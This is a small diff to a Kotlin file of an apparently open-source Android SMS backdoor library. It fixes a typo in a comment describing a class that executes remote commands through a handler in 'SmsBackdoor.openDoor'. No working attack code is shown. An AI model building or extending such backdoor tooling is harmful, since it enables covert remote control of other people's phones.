@@ -43,7 +43,7 @@ import androidx.core.app.JobIntentService
 * @email evilthreads669966@gmail.com
 * @date 10/08/20
 *
-This class is responsible for executing remote commands off of the main threads with your command handler implementation in SmsBackdoor.openDoor
+This class is responsible for executing remote commands off of the main thread with your command handler implementation in SmsBackdoor.openDoor
 **/
 internal class RemoteCommandExecutor: JobIntentService() {
 
